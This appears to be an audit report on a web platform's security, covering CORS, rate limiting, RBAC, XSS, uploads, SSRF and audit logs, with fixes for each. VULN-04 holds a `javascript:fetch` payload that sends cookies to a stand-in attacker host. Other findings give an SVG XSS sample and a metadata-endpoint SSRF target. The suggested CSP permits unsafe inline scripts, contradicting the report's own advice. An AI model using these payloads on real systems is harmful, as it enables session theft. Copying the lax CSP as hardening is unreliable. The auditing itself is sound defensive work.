# Gypsym Technology: Comprehensive Application Security Architecture Audit

**Author**: Principal Application Security Architect  
**Scope**: Full Stack Architecture & Implementation (`apps/web`, `apps/admin`, `apps/api`, `packages/database`, `packages/shared-types`)  
**Standard**: OWASP Top 10:2021, OWASP ASVS 4.0 (Level 3), CIS PostgreSQL Benchmark  
**Date**: September 2026  

---

## 1. Executive Summary

A comprehensive architectural and source-code level application security audit was performed across the Gypsym Technology ecosystem:
- **`apps/web`**: Public Next.js 14 App Router portal.
- **`apps/admin`**: Next.js 14 high-density CMS & IAM workstation.
- **`apps/api`**: NestJS modular REST API engine.
- **`packages/database`**: PostgreSQL schema and Prisma ORM layer.

The architecture demonstrates strong engineering foundations (Zod environment validation, strict TypeScript typing, Helmet headers, centralized RFC 7807 error filters, and correlation tracing). However, several architectural vulnerabilities and security hardening gaps exist that require immediate remediation before production deployment.

### Vulnerability Summary Matrix

| ID | Title | OWASP Category | Severity | CVSS v3.1 | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **VULN-01** | Permissive CORS Origin Reflection with `credentials: true` | A05:2021 - Security Misconfiguration | **HIGH** | 8.1 | Needs Patch |
| **VULN-02** | Absence of Backend Rate Limiting on Sensitive Endpoints | A04:2021 - Insecure Design | **HIGH** | 7.5 | Needs Patch |
| **VULN-03** | Client-Side Only RBAC Enforcement Risk | A01:2021 - Broken Access Control | **CRITICAL**| 9.1 | Needs Hardening |
| **VULN-04** | Potential Stored XSS in Dynamic CMS & Page Builder Blocks | A03:2021 - Injection | **HIGH** | 7.2 | Needs Hardening |
| **VULN-05** | Media Upload MIME-Spoofing & Unrestricted File Storage | A04:2021 - Insecure Design | **HIGH** | 7.8 | Needs Hardening |
| **VULN-06** | Insecure Token Storage in Client-Side Storage | A07:2021 - Identification & Auth | **MEDIUM** | 6.8 | Needs Hardening |
| **VULN-07** | Missing Server-Side SSRF Guard on Remote Asset Ingestion | A10:2021 - Server-Side Request Forgery | **MEDIUM** | 6.5 | Needs Guard |
| **VULN-08** | Audit Log Mutability at Database Layer | A09:2021 - Security Logging & Monitoring | **MEDIUM** | 5.3 | Needs DB Trigger |
| **VULN-09** | Missing Security Response Headers in Next.js Apps | A05:2021 - Security Misconfiguration | **LOW** | 4.3 | Needs Config |
| **VULN-10** | Unencrypted PII Storage in Contact & Candidate Submissions | A02:2021 - Cryptographic Failures | **MEDIUM** | 5.9 | Needs Encryption |

---

## 2. Detailed Vulnerability Findings & Remediations

---

### VULN-01: Permissive CORS Origin Reflection with `credentials: true`
- **Severity**: **HIGH** (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N - 8.1)
- **Affected Area**: `apps/api/src/main.ts` (Lines 22-35)
- **OWASP Category**: A05:2021 – Security Misconfiguration
- **Vulnerability Description**:
  In `apps/api/src/main.ts`:
  ```typescript
  const corsOrigins = configService.get<string>('CORS_ORIGINS', '')
    .split(',')
    .map((o) => o.trim())
    .filter(Boolean);

  app.use(
    cors({
      origin: corsOrigins.length > 0 ? corsOrigins : true,
      credentials: true,
      ...
  ```
  When `CORS_ORIGINS` is unset, empty, or misconfigured in production, `origin: true` dynamically reflects the incoming `Origin` request header. Coupled with `credentials: true`, any malicious third-party site visited by an authenticated administrator can initiate cross-origin credentialed XMLHttpRequests to `/api/v1`, extracting administrative data and reading confidential responses.
- **Attack Scenario**:
  1. An admin logged into `https://admin.gypsym.com` visits an untrusted website `https://attacker-site.com`.
  2. `attacker-site.com` executes a background script fetching `https://api.gypsym.com/api/v1/system/users` with `credentials: 'include'`.
  3. The server inspects the request, sees `origin: true`, and returns `Access-Control-Allow-Origin: https://attacker-site.com` and `Access-Control-Allow-Credentials: true`.
  4. The attacker's browser reads the full user directory, emails, roles, and administrative data.
- **Remediation**:
  Enforce a strict whitelist validation. Under zero circumstances allow `origin: true` when `credentials: true` is enabled. In production, fail-closed if `CORS_ORIGINS` is not explicitly defined.
  ```typescript
  // Patch for apps/api/src/main.ts
  const rawOrigins = configService.get<string>('CORS_ORIGINS', '');
  const allowedOrigins = rawOrigins
    .split(',')
    .map((o) => o.trim())
    .filter(Boolean);

  if (process.env.NODE_ENV === 'production' && allowedOrigins.length === 0) {
    throw new Error('FATAL SECURITY ERROR: CORS_ORIGINS must be explicitly configured in production.');
  }

  app.use(
    cors({
      origin: (origin, callback) => {
        // Allow requests with no origin (like mobile apps, curl, server-to-server)
        if (!origin) return callback(null, true);
        if (allowedOrigins.includes(origin)) {
          return callback(null, true);
        }
        return callback(new Error(`CORS policy violation: origin ${origin} not allowed`), false);
      },
      credentials: true,
      methods: ['GET', 'HEAD', 'PUT', 'PATCH', 'POST', 'DELETE', 'OPTIONS'],
      allowedHeaders: ['Content-Type', 'Authorization', 'x-correlation-id', 'x-request-id', 'Idempotency-Key'],
      exposedHeaders: ['x-correlation-id', 'x-request-id', 'X-RateLimit-Limit', 'X-RateLimit-Remaining'],
      maxAge: 86400, // 24 hours preflight cache
    }),
  );
  ```
- **Verification Method**:
  Execute an `OPTIONS` preflight request with an unauthorized origin:
  ```bash
  curl -I -X OPTIONS http://localhost:4000/api/v1/health \
    -H "Origin: https://malicious-domain.com" \
    -H "Access-Control-Request-Method: GET"
  ```
  Assert that the response returns HTTP 403 or does **not** include `Access-Control-Allow-Origin: https://malicious-domain.com`.

---

### VULN-02: Absence of Backend Rate Limiting on Sensitive Endpoints
- **Severity**: **HIGH** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H - 7.5)
- **Affected Area**: `apps/api/src/app.module.ts`, `apps/api/src/main.ts`
- **OWASP Category**: A04:2021 – Insecure Design
- **Vulnerability Description**:
  The NestJS API currently does not register `@nestjs/throttler` or Redis-backed distributed rate limiting middleware. Consequently:
  - `/api/v1/auth/login` is vulnerable to automated credential stuffing and dictionary attacks.
  - `/api/v1/contact` and `/api/v1/newsletter` are vulnerable to email bombing and database storage exhaustion.
  - Content endpoints are vulnerable to Layer-7 Denial of Service (DoS).
- **Attack Scenario**:
  An adversary runs a distributed botnet firing 100,000 requests per minute against `/api/v1/auth/login` with breached password dumps. Because no throttling exists, the server spends excessive CPU cycles running Argon2id hashing algorithms, degrading performance for legitimate enterprise customers and eventually causing resource starvation.
- **Remediation**:
  1. Install `@nestjs/throttler`.
  2. Implement tiered rate limiting:
     - Global limit: 100 requests per minute per IP.
     - Auth limit: 5 requests per 15 minutes per IP.
     - Public forms limit: 10 requests per hour per IP.
  ```typescript
  // In apps/api/src/app.module.ts
  import { ThrottlerModule, ThrottlerGuard } from '@nestjs/throttler';
  import { APP_GUARD } from '@nestjs/core';

  @Module({
    imports: [
      ThrottlerModule.forRoot([
        {
          name: 'short',
          ttl: 1000,
          limit: 10, // 10 req/sec
        },
        {
          name: 'medium',
          ttl: 60000,
          limit: 100, // 100 req/min
        },
      ]),
      // ... other modules
    ],
    providers: [
      {
        provide: APP_GUARD,
        useClass: ThrottlerGuard,
      },
    ],
  })
  export class AppModule {}
  ```
  Apply `@Throttle({ default: { limit: 5, ttl: 900000 } })` on `AuthController.login`.
- **Verification Method**:
  Run a k6 or bash burst script sending 10 consecutive requests to `/api/v1/auth/login` within 5 seconds. Verify that requests 6 through 10 return `HTTP 429 Too Many Requests` with a `Retry-After` header.

---

### VULN-03: Client-Side Only RBAC Enforcement Risk
- **Severity**: **CRITICAL** (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H - 9.1)
- **Affected Area**: `apps/admin/src/components/auth/permission-guard.tsx`, `apps/api/src/modules/`
- **OWASP Category**: A01:2021 – Broken Access Control
- **Vulnerability Description**:
  In `apps/admin`, `<PermissionGuard>` conditionally hides action buttons (e.g. Delete, Edit, Publish) based on the user's role in local state. However, client-side UI shielding provides zero security boundary if the NestJS API does not strictly validate user permissions on every corresponding endpoint.
  Furthermore, there is a role enum divergence:
  - Database schema (`schema.prisma`): `SUPER_ADMIN`, `SYSTEM_ADMIN`, `CONTENT_EDITOR`, `RECRUITER`, `AUDITOR`.
  - Admin UI (`auth-context.tsx`): `SUPER_ADMIN`, `ADMIN`, `EDITOR`, `AUTHOR`, `VIEWER`.
  Without strict alignment and backend enforcement, an authenticated user with role `VIEWER` can bypass the frontend UI and issue raw HTTP `DELETE /api/v1/pages/:id` or `POST /api/v1/system/users` requests directly.
- **Attack Scenario**:
  A compromised employee account assigned the `VIEWER` role uses browser DevTools or Postman to send a `DELETE /api/v1/pages/pg-home` request with their valid Bearer token. If the backend route only checks `@UseGuards(JwtAuthGuard)` without `@RequirePermissions('pages:delete')`, the homepage is deleted.
- **Remediation**:
  1. Synchronize the canonical `RoleType` enum across `packages/database`, `packages/shared-types`, and `apps/admin`.
  2. Implement an atomic, declarative `@RequirePermissions()` decorator and `PermissionsGuard` in NestJS:
  ```typescript
  // packages/shared-types/src/index.ts
  export type SystemRole = 'SUPER_ADMIN' | 'ADMIN' | 'EDITOR' | 'AUTHOR' | 'VIEWER';

  // apps/api/src/common/guards/permissions.guard.ts
  @Injectable()
  export class PermissionsGuard implements CanActivate {
    constructor(private reflector: Reflector) {}

    canActivate(context: ExecutionContext): boolean {
      const requiredPermissions = this.reflector.getAllAndOverride<string[]>('permissions', [
        context.getHandler(),
        context.getClass(),
      ]);
      if (!requiredPermissions || requiredPermissions.length === 0) return true;

      const { user } = context.switchToHttp().getRequest();
      if (!user) return false;
      if (user.role === 'SUPER_ADMIN') return true;

      const userPermissions: string[] = user.permissions || [];
      return requiredPermissions.every((p) => userPermissions.includes(p));
    }
  }
  ```
  Every mutating controller method must specify required permissions:
  ```typescript
  @Delete(':id')
  @RequirePermissions('pages:delete')
  @UseGuards(JwtAuthGuard, PermissionsGuard)
  async deletePage(@Param('id') id: string) { ... }
  ```
- **Verification Method**:
  Issue a `DELETE` request with an authenticated JWT belonging to a `VIEWER`:
  ```bash
  curl -X DELETE http://localhost:4000/api/v1/pages/pg-1 \
    -H "Authorization: Bearer <VIEWER_JWT_TOKEN>"
  ```
  Verify the server responds with `HTTP 403 Forbidden` and does not delete the record.

---

### VULN-04: Potential Stored XSS in Dynamic CMS & Page Builder Blocks
- **Severity**: **HIGH** (CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N - 7.2)
- **Affected Area**: `apps/admin/src/app/(dashboard)/pages/[id]/builder/page.tsx`, `apps/web/src/app/`
- **OWASP Category**: A03:2021 – Injection (Cross-Site Scripting)
- **Vulnerability Description**:
  The Page Builder allows editors to configure 19 distinct section types, including headlines, subtitles, CTA links, and custom rich text. If CTA links (e.g. `javascript:eval(...)`) or raw markdown/HTML blocks are rendered in `apps/web` using `dangerouslySetInnerHTML` or directly as `href` attributes without protocol sanitization, an attacker with `EDITOR` credentials can inject stored XSS that executes in the browsers of all public site visitors.
- **Attack Scenario**:
  A rogue or compromised editor sets a section CTA destination URL to:
  `javascript:fetch('https://attacker.com/steal?c='+document.cookie)`
  When executive clients click the CTA button on the public homepage, their session cookies and local storage tokens are exfiltrated to the attacker's server.
- **Remediation**:
  1. **Link Protocol Whitelisting**: Restrict all link targets to `http://`, `https://`, `mailto:`, or internal relative paths (`/`):
     ```typescript
     export function sanitizeUrl(url: string): string {
       if (!url) return '#';
       const trimmed = url.trim();
       if (trimmed.startsWith('/') || trimmed.startsWith('#')) return trimmed;
       try {
         const parsed = new URL(trimmed);
         if (['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol)) {
           return trimmed;
         }
       } catch {
         // Invalid URL
       }
       return '#';
     }
     ```
  2. **HTML Sanitization**: For any rich text, parse through `sanitize-html` or `isomorphic-dompurify` with strict tag and attribute whitelists.
  3. Implement a robust Content Security Policy (CSP) blocking inline script execution.
- **Verification Method**:
  Attempt to save a page section with `ctaLink: "javascript:alert(1)"`. Verify that when rendered on the public website, the link resolves to `#` or sanitized text, preventing script execution upon click.

---

### VULN-05: Media Upload MIME-Spoofing & Unrestricted File Storage
- **Severity**: **HIGH** (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N - 7.8)
- **Affected Area**: `apps/admin/src/app/(dashboard)/media/page.tsx`, `apps/api/src/modules/media/`
- **OWASP Category**: A04:2021 – Insecure Design
- **Vulnerability Description**:
  Media library uploads and job candidate resume uploads must be verified at the binary level. Relying solely on client-provided `file.type` or file extensions permits attackers to upload executable files (e.g. Polyglot HTML/SVG images with embedded `<script>` tags, or disguised scripts). If served from the primary application origin with `Content-Type: image/svg+xml`, opening the media asset executes arbitrary JavaScript in the context of the Gypsym domain.
- **Attack Scenario**:
  An attacker uploads an SVG image containing:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  </svg>
  ```
  The file is uploaded as `logo.svg`. When an administrator reviews the asset at `https://admin.gypsym.com/uploads/logo.svg`, the embedded JavaScript triggers, capturing the admin session.
- **Remediation**:
  1. **Magic Number Sniffing**: Inspect buffer headers using `file-type` to detect the true MIME type.
  2. **SVG Sanitization**: Process SVGs using `DOMPurify` / `svg-purify` to strip all `<script>`, `<foreignObject>`, and event handlers.
  3. **Isolated Serving Origin**: Store all user media in Amazon S3 or Google Cloud Storage, served exclusively from a distinct, sandboxed cookieless domain (e.g. `cdn.gypsym-assets.com`).
  4. **Strict HTTP Headers on Uploads**:
     - `Content-Disposition: inline; filename="asset.png"` (or `attachment` for PDFs).
     - `X-Content-Type-Options: nosniff`.
     - `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`.
- **Verification Method**:
  Upload an SVG containing `<script>alert('XSS')</script>`. Inspect the sanitized file; assert the `<script>` block has been stripped. Verify that the asset response headers contain `X-Content-Type-Options: nosniff`.

---

### VULN-06: Insecure Token Storage in Client-Side Storage
- **Severity**: **MEDIUM** (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N - 6.8)
- **Affected Area**: `apps/admin/src/lib/auth-context.tsx`
- **OWASP Category**: A07:2021 – Identification and Authentication Failures
- **Vulnerability Description**:
  Storing JWT access tokens or refresh tokens in `window.localStorage` exposes them to any XSS vulnerability present in the application or in any third-party npm dependency.
- **Remediation**:
  1. **HttpOnly Cookies**: Deliver the `refreshToken` exclusively via an `HttpOnly`, `Secure`, `SameSite=Strict` cookie (`Path=/api/v1/auth/refresh`).
  2. **In-Memory Access Tokens**: Keep the short-lived `accessToken` (15 min lifespan) strictly in React memory state.
  3. On page refresh, perform a silent refresh call to `/api/v1/auth/refresh` using the HttpOnly cookie to re-populate the access token in memory.
- **Verification Method**:
  Inspect browser `localStorage` and `sessionStorage` following authentication. Assert that neither contains raw JWT tokens.

---

### VULN-07: Missing Server-Side SSRF Guard on Remote Asset Ingestion
- **Severity**: **MEDIUM** (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N - 6.5)
- **Affected Area**: Future API integrations / DAM URL Import
- **OWASP Category**: A10:2021 – Server-Side Request Forgery
- **Vulnerability Description**:
  If the media library or Page Builder provides a feature to "Import from URL" or unfurl link metadata, the backend will initiate HTTP requests to arbitrary user-supplied URLs. Without validation, this enables SSRF targeting cloud internal metadata endpoints (e.g. `http://169.254.169.254/latest/meta-data/`) or internal cluster services (`http://localhost:6379`, `http://10.0.0.1`).
- **Remediation**:
  Implement an SSRF protection utility resolving DNS and validating IP ranges before dispatching requests:
  ```typescript
  import dns from 'node:dns/promises';
  import ipaddr from 'ipaddr.js';

  export async function validateSafeUrl(urlString: string): Promise<string> {
    const parsed = new URL(urlString);
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error('Disallowed protocol');
    }

    const addresses = await dns.resolve4(parsed.hostname);
    for (const addr of addresses) {
      const ip = ipaddr.parse(addr);
      if (ip.range() !== 'unicast' || ip.range() === 'private' || ip.range() === 'loopback') {
        throw new Error(`SSRF blocked: host resolves to private/internal IP (${addr})`);
      }
    }
    return urlString;
  }
  ```
- **Verification Method**:
  Attempt to import an asset with URL `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Verify the request is rejected with an SSRF exception before any network packet leaves the host.

---

### VULN-08: Audit Log Mutability at Database Layer
- **Severity**: **MEDIUM** (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:N - 5.3)
- **Affected Area**: `packages/database/prisma/schema.prisma` (AuditLog table)
- **OWASP Category**: A09:2021 – Security Logging and Monitoring Failures
- **Vulnerability Description**:
  The `AuditLog` table stores compliance events, actor identities, IP addresses, and before/after diffs. While the API may not expose `DELETE /api/v1/audit`, a database user with `ALL PRIVILEGES` or a compromised high-privilege application database connection could modify or truncate audit records, eliminating forensic evidence of an intrusion.
- **Remediation**:
  Enforce database-level immutability using PostgreSQL rules or triggers that disallow `UPDATE` and `DELETE` on the `audit_logs` table:
  ```sql
  -- PostgreSQL Migration: Enforce Append-Only Audit Logs
  CREATE OR REPLACE FUNCTION prevent_audit_log_modification()
  RETURNS TRIGGER AS $$
  BEGIN
    RAISE EXCEPTION 'COMPLIANCE VIOLATION: Records in audit_logs are immutable and cannot be modified or deleted.';
  END;
  $$ LANGUAGE plpgsql;

  CREATE TRIGGER trg_audit_logs_immutable
  BEFORE UPDATE OR DELETE ON audit_logs
  FOR EACH ROW EXECUTE FUNCTION prevent_audit_log_modification();
  ```
- **Verification Method**:
  Execute an `UPDATE` or `DELETE` statement against `audit_logs` in `psql`:
  ```sql
  DELETE FROM audit_logs WHERE id = '...';
  ```
  Assert that PostgreSQL aborts the transaction with `COMPLIANCE VIOLATION`.

---

### VULN-09: Missing Security Response Headers in Next.js Frontends
- **Severity**: **LOW** (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N - 4.3)
- **Affected Area**: `apps/web/next.config.mjs`, `apps/admin/next.config.mjs`
- **OWASP Category**: A05:2021 – Security Misconfiguration
- **Vulnerability Description**:
  While the NestJS API applies `helmet()`, the Next.js frontend applications do not define explicit HTTP security headers in `next.config.mjs`. As a result, pages could be framed inside malicious iframes (Clickjacking), and browsers will not enforce strict transport security or MIME-type protections on SSR responses.
- **Remediation**:
  Configure comprehensive enterprise security headers in both `next.config.mjs` files:
  ```javascript
  // apps/web/next.config.mjs & apps/admin/next.config.mjs
  /** @type {import('next').NextConfig} */
  const nextConfig = {
    async headers() {
      return [
        {
          source: '/(.*)',
          headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
            { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
            {
              key: 'Strict-Transport-Security',
              value: 'max-age=63072000; includeSubDomains; preload',
            },
            {
              key: 'Content-Security-Policy',
              value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: https:; connect-src 'self' http://localhost:4000 https://api.gypsym.com;",
            },
          ],
        },
      ];
    },
  };
  export default nextConfig;
  ```
- **Verification Method**:
  Inspect response headers using `curl -I http://localhost:3000/`. Verify all 6 security headers are present.

---

### VULN-10: Unencrypted PII Storage in Contact & Candidate Submissions
- **Severity**: **MEDIUM** (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N - 5.9)
- **Affected Area**: `packages/database/prisma/schema.prisma` (`ContactSubmission`, `JobApplication`)
- **OWASP Category**: A02:2021 – Cryptographic Failures
- **Vulnerability Description**:
  Contact inquiries and candidate submissions store executive names, corporate emails, phone numbers, estimated budgets, and resume links in plaintext. In the event of an unauthorized database backup leak or compromised read replica, sensitive prospective customer data and applicant PII are exposed in unencrypted format.
- **Remediation**:
  1. Implement application-level envelope encryption (AES-256-GCM) for sensitive fields (`workEmail`, `phone`, `resumeUrl`) before storing in PostgreSQL, using a key managed by AWS KMS / HashiCorp Vault.
  2. Implement database-level Transparent Data Encryption (TDE) on PostgreSQL storage volumes (e.g. AWS RDS / Aurora encrypted storage).
  3. Define a GDPR/CCPA automated data retention policy purge job deleting inquiries older than 365 days.
- **Verification Method**:
  Query PostgreSQL directly via raw SQL:
  ```sql
  SELECT phone, work_email FROM contact_submissions;
  ```
  Assert that fields are stored as ciphertext strings or encrypted byte arrays.

---

## 3. Infrastructure & Deployment Hardening Checklist

| Domain | Control | Standard / Benchmark | Verification Action |
| :--- | :--- | :--- | :--- |
| **PostgreSQL** | Least Privilege DB User | CIS Benchmark 1.1 | Application connects using a restricted user role, never `postgres` superuser. |
| **Database Network**| Private Subnet Isolation | Zero Trust | Database port `5432` has zero internet ingress; accessible only via VPC peering/security group from API nodes. |
| **Secrets Management**| Zero Hardcoded Secrets | 12-Factor App | Secrets injected exclusively via AWS Secrets Manager or HashiCorp Vault. No `.env` committed to git. |
| **Containers** | Non-Root User Execution | Docker CIS 4.1 | Docker containers run as unprivileged user (e.g. `USER node` / `USER 10001`). |
| **TLS Encryption** | TLS 1.3 Strict | NIST SP 800-52r2 | Terminate TLS with modern ciphers only (AES-256-GCM, CHACHA20-POLY1305). SSLv3, TLS 1.0, and TLS 1.1 disabled. |
| **Backups** | Automated & Encrypted | ISO 27001 A.12.3 | Point-in-time recovery (PITR) enabled with 30-day retention; backups encrypted with KMS keys and tested quarterly. |

---

## 4. Remediation Implementation Roadmap

```
+----------------------------------------------------------------------------------------------------+
|                                    SECURITY REMEDIATION PLAN                                       |
+----------------------------------------------------------------------------------------------------+
| PHASE 1: IMMEDIATE CRITICAL FIXES (Week 1)                                                         |
|   1. Patch CORS Origin Reflection in apps/api/src/main.ts (VULN-01)                                 |
|   2. Install @nestjs/throttler for brute-force defense on /auth and /contact (VULN-02)             |
|   3. Deploy PermissionsGuard & synchronize RoleType enum across monorepo (VULN-03)                 |
|                                                                                                    |
| PHASE 2: INJECTION & STORAGE DEFENSES (Week 2)                                                     |
|   4. Enforce sanitizeUrl() & HTML sanitization on Page Builder CTA links (VULN-04)                 |
|   5. Deploy magic-number sniffing & SVG sanitization for media DAM (VULN-05)                       |
|   6. Migrate refresh token storage to HttpOnly SameSite=Strict cookies (VULN-06)                   |
|                                                                                                    |
| PHASE 3: COMPLIANCE & INFRASTRUCTURE HARDENING (Week 3)                                            |
|   7. Apply PostgreSQL immutability trigger on audit_logs (VULN-08)                                 |
|   8. Inject security response headers in Next.js next.config.mjs (VULN-09)                          |
|   9. Enforce application-level PII encryption for inquiries and ATS applications (VULN-10)         |
+----------------------------------------------------------------------------------------------------+
```
